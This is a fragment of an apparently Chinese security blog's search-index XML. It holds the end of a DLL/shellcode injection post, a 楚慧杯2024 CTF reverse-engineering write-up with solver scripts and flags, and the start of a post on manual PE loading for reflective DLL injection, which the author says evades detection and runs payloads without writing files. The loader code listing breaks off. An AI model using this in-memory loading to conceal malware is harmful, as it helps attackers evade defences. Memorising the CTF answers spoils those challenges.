(!<span class="built_in">lstrcmpA</span>(pFuncName, funcName)) &#123;</span><br><span class="line">WORD hint = addrOfNameofNameOrdinals[i];</span><br><span class="line">Func = (LPVOID)((BYTE*)memBase + addrOfFunc[hint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Func == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找导出函数失败\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Func;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
          <category> shellcode注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>楚慧杯2024-re-wp</title>
      <link href="/posts/2dd40b61.html"/>
      <url>/posts/2dd40b61.html</url>
      
        <content type="html"><![CDATA[<p>难得遇到一个简单的比赛QAQ</p><h2 id="go-bytes">go_bytes</h2><p>打开后找到main函数，可以直接看到两个40长度的for循环，第二个直接比较了</p><p>两段分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">40</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= i )</span><br><span class="line">      runtime_panicIndex(i, ptr, ptr);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = *(_BYTE *)(v6 + i);</span><br><span class="line">    v10 = i</span><br><span class="line">        - <span class="number">40</span> * ((__int64)(((<span class="type">unsigned</span> __int128)((i + <span class="number">1</span>) * (__int128)(__int64)<span class="number">0xCCCCCCCCCCCCCCCD</span>LL) &gt;&gt; <span class="number">64</span>) + i + <span class="number">1</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= v10 + <span class="number">1</span> )</span><br><span class="line">      runtime_panicIndex(v10 + <span class="number">1</span>, ptr, ptr);</span><br><span class="line">    *(_BYTE *)(v8 + i) = (*(_BYTE *)(v10 + v8 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * v9);</span><br><span class="line">    v6 = v8;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt; <span class="number">40</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)ptr &lt;= j )</span><br><span class="line">      runtime_panicIndex(j, ptr, ptr);</span><br><span class="line">    v12 = *(<span class="type">unsigned</span> __int8 *)(v6 + j);</span><br><span class="line">    main_tmp = (<span class="type">unsigned</span> __int16)(<span class="number">291</span> * main_tmp + <span class="number">1110</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16[j] != (main_tmp ^ v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = j;</span><br><span class="line">      v21[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">      v21[<span class="number">1</span>] = &amp;off_4DCF10;</span><br><span class="line">      fmt_Fprintln(&amp;go_itab__os_File_io_Writer, os_Stdout, v21, <span class="number">1LL</span>, <span class="number">1LL</span>);</span><br><span class="line">      os_Exit(<span class="number">0LL</span>);</span><br><span class="line">      v6 = v18;</span><br><span class="line">      j = v13;</span><br><span class="line">      ptr = v14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>拿到v16然后求出v12，反向位运算即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">xor_data = <span class="number">0xDEAD</span></span><br><span class="line">last = [<span class="number">0x22B9</span>, <span class="number">0xC9F8</span>, <span class="number">0x8C89</span>, <span class="number">0xFF18</span>, <span class="number">0x1439</span>, <span class="number">0x4E0A</span>, <span class="number">0x2A8B</span>, <span class="number">0x07CB</span>, <span class="number">0xBDEB</span>, <span class="number">0xFAAB</span>, <span class="number">0x3FFB</span>, <span class="number">0x784B</span>, <span class="number">0x9F1E</span>, <span class="number">0x4FEB</span>, <span class="number">0x4D0B</span>, <span class="number">0xD08E</span>, <span class="number">0x38BB</span>, <span class="number">0xCBAE</span>, <span class="number">0xD2CE</span>, <span class="number">0x913E</span>, <span class="number">0x0A6B</span>, <span class="number">0xF03B</span>, <span class="number">0x507B</span>, <span class="number">0x398B</span>, <span class="number">0x93DE</span>, <span class="number">0x3CCE</span>, <span class="number">0x459E</span>, <span class="number">0x4ABE</span>, <span class="number">0x553E</span>, <span class="number">0x316E</span>, <span class="number">0x33BE</span>, <span class="number">0x42FE</span>, <span class="number">0xCECE</span>, <span class="number">0x4DDE</span>, <span class="number">0x982B</span>, <span class="number">0xA31B</span>, <span class="number">0x802E</span>, <span class="number">0x12EE</span>, <span class="number">0xF67A</span>, <span class="number">0xEB79</span>]</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    xor_data = (xor_data*<span class="number">291</span>+<span class="number">1110</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    enc.append(last[i] ^ xor_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aenc</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line">        enc[i] = enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>|((enc[i]&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xf0</span>)</span><br><span class="line">    pl(enc)</span><br><span class="line">aenc(enc)</span><br><span class="line"><span class="comment"># DSCTF&#123;faddff8cb4d711edbb2294085339ce84&#125;</span></span><br></pre></td></tr></table></figure><h2 id="bouquet">bouquet</h2><p>已知二叉树中序和后序遍历结果，求层序</p><p>根据根据后序的输出逐个递归求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val=<span class="number">0</span>, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildTree</span>(<span class="params">inorder, postorder</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> inorder <span class="keyword">or</span> <span class="keyword">not</span> postorder:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    root_val = postorder.pop()</span><br><span class="line">    root = TreeNode(root_val)</span><br><span class="line">    inorder_index = inorder.index(root_val)</span><br><span class="line">    root.right = buildTree(inorder[inorder_index+<span class="number">1</span>:], postorder)</span><br><span class="line">    root.left = buildTree(inorder[:inorder_index], postorder)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    queue = [root]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        level = []</span><br><span class="line">        next_queue = []</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> queue:</span><br><span class="line">            level.append(node.val)</span><br><span class="line">            <span class="keyword">if</span> node.left:</span><br><span class="line">                next_queue.append(node.left)</span><br><span class="line">            <span class="keyword">if</span> node.right:</span><br><span class="line">                next_queue.append(node.right)</span><br><span class="line">        result.append(level)</span><br><span class="line">        queue = next_queue</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(item) <span class="keyword">for</span> sublist <span class="keyword">in</span> result <span class="keyword">for</span> item <span class="keyword">in</span> sublist])</span><br><span class="line"></span><br><span class="line">back = <span class="built_in">list</span>(<span class="string">&quot;j7aw_sC3addq4TAo&#125;8_Fda&#123;SD&quot;</span>)</span><br><span class="line">mide = <span class="built_in">list</span>(<span class="string">&quot;ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a&quot;</span>)</span><br><span class="line">root = buildTree(mide, back)</span><br><span class="line"></span><br><span class="line">level_order_result = levelOrder(root)</span><br><span class="line"><span class="built_in">print</span>(level_order_result)</span><br></pre></td></tr></table></figure><h2 id="zistel">zistel</h2><p>通过字符串输出找到主函数</p><p><img src="https://s2.loli.net/2024/12/20/baHMl2z3ZKkLsVo.png" alt="image-20241220171522560"></p><p>找到逻辑，逐个分析调试</p><p>基本加密逻辑是</p><p><img src="https://s2.loli.net/2024/12/20/v8NKBsnZoVDzXCu.png" alt="image-20241220171837133"></p><p>因此要找到每轮通过100261B生成的xorNum</p><p>逻辑是通过一个256位替换表进行的替换</p><p><img src="https://s2.loli.net/2024/12/20/f1noEMOhzrPUBCk.png" alt="image-20241220172004730"></p><p>写出脚本直接逆即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">thisKey</span><span class="params">(DWORD key, DWORD num)</span> </span>&#123;</span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i &amp; <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD xorData = key ^ num;</span><br><span class="line">PBYTE pxd = (PBYTE)&amp;xorData;</span><br><span class="line">PBYTE pky = (PBYTE)&amp;key;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD mid = pxd[i];</span><br><span class="line">DWORD x = S[pky[i]];</span><br><span class="line">pxd[i] = pxd[x];</span><br><span class="line">pxd[x] = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; std::hex &lt;&lt; xorData &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">return</span> key ^ xorData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(DWORD* m, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = m[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = m[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v1;</span><br><span class="line">v1 = v0 ^ <span class="built_in">thisKey</span>(key[i], v1);</span><br><span class="line">v0 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dec</span><span class="params">(DWORD* c, DWORD* key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; v0 = c[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">auto</span>&amp; v1 = c[<span class="number">1</span>];</span><br><span class="line">std::<span class="built_in">swap</span>(v0, v1);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v0;</span><br><span class="line">v0 = v1 ^ <span class="built_in">thisKey</span>(key[i], v0);</span><br><span class="line">v1 = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD last[] = &#123;</span><br><span class="line"><span class="number">0x33293158</span>, <span class="number">0x60760211</span>, <span class="number">0x42185F46</span>, <span class="number">0x63746F29</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD key[] = &#123; <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span>, <span class="number">0xBEEFDEAD</span>, <span class="number">0xBBDBD183</span>, <span class="number">0x05340F2E</span> &#125;;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line"><span class="built_in">dec</span>(&amp;last[<span class="number">2</span>], key);</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(last) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//z1g_I3_S0_Coo0l!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> zig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE加载器实现</title>
      <link href="/posts/29d83bc1.html"/>
      <url>/posts/29d83bc1.html</url>
      
        <content type="html"><![CDATA[<p>最近想学DLL反射注入，但是发现要手动生成内存的DLL文件，所以就先尝试学PE加载器的实现</p><p>跟着佬的博客学的，感觉讲的很详细</p><p><a href="https://www.kn0sky.com/?p=37">手工模拟PE加载器 - 我可是会飞的啊</a></p><hr><h2 id="模拟加载PE文件">模拟加载PE文件</h2><p>将DLL或者EXE文件手动加载到内存中，而不是用CreateProcess或者LoadLibrary函数来操作，防止了部分检测手段，同时将文件数据加入到资源节中可以实现不将其落地就可以执行的效果，减少了生成文件的检测手段</p><h2 id="原理">原理</h2><ul><li>将对应PE文件按节区顺序从文件结构映射到映像内存结构放入内存</li><li>根据重定位表修改硬编码数据指令</li><li>从导入表获取所需函数，修正导入表函数地址(如果是相同进程，可以用本进程的导入表直接修改)</li><li>执行/如果是DLL则是主动执行DLLMain</li></ul><h2 id="重要信息">重要信息</h2><h3 id="映射PE头">映射PE头</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OptionalHeader.SizeOfHeaders<span class="comment">//获取PE头大小</span></span><br></pre></td></tr></table></figure><h3 id="映射Section">映射Section</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_FIRST_SECTION(pedata.ntHeader)<span class="comment">//获取节区头</span></span><br><span class="line">sectionHeader[i].PointerToRawData<span class="comment">//文件偏移</span></span><br><span class="line">sectionHeader[i].VirtualAddress<span class="comment">//内存偏移</span></span><br><span class="line">sectionHeader[i].SizeOfRawData<span class="comment">//文件大小</span></span><br></pre></td></tr></table></figure><h3 id="修复RelocTable">修复RelocTable</h3><p>重定位表结构类似</p><p><img src="https://s2.loli.net/2024/12/20/VoreMAq6SzYnwdg.png" alt="image-20241217021229993"></p><p>虽然标准载入PE(exe)的时候是不需要重定位节区的，但是这里是在加载器空间创建内存，所以依然需要修复重定位表。</p><p>重定位表中的每一项都是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>TypeOffset是一个数组，每一个元素是一个偏移值说明这一个VirtualAddress段有哪些需要重定位的地址。SizeOfBlock包含了整个结构的大小和TypeOffset的大小</p><p>Block中TypeOffest为一个字，高4位表示类型，3表示x86，A表示x64，低12位表示偏移量<br>默认内存偏移量为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><p>当前内存偏移量为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newMemBase + VirtualAddress + TypeOffest&amp;<span class="number">0xfff</span></span><br></pre></td></tr></table></figure><h3 id="修复IAT">修复IAT</h3><p>IAT表每个元素都是一个如下结构体IID，每个结构体对应一个DLL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>该结构体中，Name字段标识了DLL名称的RVA</p><p>FirstThunk是最后的导入地址表指针，最后需要把每个导入的函数的真实地址填入到这里指向的位置</p><p>DUMMYUNIONNAME中，一般类型是OriginalFirstThunk，如果是Characteristics，就表示结束（0）<br>OriginalFirstThunk和导入函数的名称或者序号有关</p><p>OriginalFirstThunk和FirstThunk指向了IMAGE_THUNK_DATA结构体的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA64</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONGLONG ForwarderString;  <span class="comment">// PBYTE </span></span><br><span class="line">        ULONGLONG Function;         <span class="comment">// PDWORD</span></span><br><span class="line">        ULONGLONG Ordinal;</span><br><span class="line">        ULONGLONG AddressOfData;    <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA64;</span><br></pre></td></tr></table></figure><p>具体结构如上，其中AddressOfData是指向IMAGE_IMPORT_BY_NAME的结构体，具体结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>如果指向的是<code>导入名称表</code>，那么u1是AddressOfData，<br>如果是<code>导入地址表</code>，分为两种情况<br>若是序号导入，u1是Ordinal，首位为1，低4位是导入序号<br>若是名称导入，u1是Function，目标导入地址</p><p>所以我们要同时遍历两个表进行赋值</p><h2 id="代码">代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 